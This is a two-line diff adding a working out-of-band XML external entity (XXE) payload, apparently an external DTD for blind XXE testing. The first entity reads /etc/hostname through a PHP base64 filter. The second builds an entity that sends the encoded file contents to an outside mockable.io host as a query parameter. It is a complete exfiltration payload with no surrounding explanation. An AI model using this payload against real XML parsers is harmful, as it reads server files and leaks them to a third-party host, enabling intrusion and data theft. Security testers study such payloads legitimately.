@@ -1,0 +1,2 @@
+<!ENTITY % three SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hostname">
+<!ENTITY % two "<!ENTITY four SYSTEM 'http://demo6986808.mockable.io/?test=%three;'>">
